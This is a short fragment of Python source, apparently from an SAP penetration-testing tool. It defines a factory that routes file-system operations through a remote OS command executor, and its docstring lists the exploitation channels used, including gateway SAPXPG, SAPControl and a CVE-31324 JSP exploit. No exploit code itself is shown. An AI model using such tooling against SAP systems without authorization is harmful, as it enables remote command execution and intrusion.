        "mode":   "<DIR>" if is_dir else "",
    }


# --------------------------------------------------------------------------
# Convenience factory — build an ExecFn from a SAPNode + Credentials
# --------------------------------------------------------------------------

def make_exec_fn_from_node(node, creds=None,
                            prefer: str = "") -> ExecFn:
    """Return an ExecFn that delegates every call to
    :func:`sapmap_exploit.execute_os_command`.

    This is what GUI handlers use — they have a node + creds in
    scope and want an ExecFn without threading channel selection
    through the call site.  ``execute_os_command`` internally picks
    the best available channel (CTCWebService > SXPG-auth > GW
    SAPXPG > SAPControl > CVE-31324 JSP) so the TargetFS caller
    gets multi-channel dispatch for free.

    Kept as a factory (not a bound method) so TargetFS itself has
    no dependency on sapmap_exploit at import time — the module
    stays testable with a plain mock ExecFn.
    """
    from sapmap_exploit import execute_os_command

    def _fn(program: str, args: str) -> dict:
        return execute_os_command(node, program, args,
                                    creds=creds, prefer=prefer)
    return _fn
